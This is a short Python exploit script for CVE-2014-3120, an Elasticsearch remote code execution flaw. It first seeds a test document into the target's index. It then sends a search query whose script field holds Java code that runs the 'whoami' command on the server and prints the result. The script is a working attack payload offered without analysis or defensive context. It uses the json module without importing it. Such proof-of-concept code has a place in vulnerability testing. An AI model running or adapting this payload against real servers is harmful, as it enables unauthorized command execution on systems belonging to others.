#!/usr/bin/env python
# coding: utf-8
# Date  : 2018-07-12 21:11:55
# Author: b4zinga
# Email : b4zinga@outlook.com
# Func  :

import requests

def run(url):
    """CVE-2014-3120"""
    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    req = requests.post(url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""", timeout=5)  # es 中至少存在一条数据, so, 创建
    # print(req.text)  # {"_index":"website","_type":"blog","_id":"gyLnhuVzSBGc9sN1g4v8iQ","_version":1,"created":true}
    data ={
            "size": 1,
            "query": {
              "filtered": {
                "query": {
                  "match_all": {
                  }
                }
              }
            },
            "script_fields": {
                "command": {
                    "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"
                }
            }
        }

    req = requests.post(url+':9200/_search?pretty', headers=headers, data=json.dumps(data), timeout=5)
    if req.status_code == 200:
        result = json.loads(req.text)
        print(result['hits']['hits'][0]['fields']['command'])

        return 'ElasticSearch Remote Code Exec ~ '
    else:
        return False
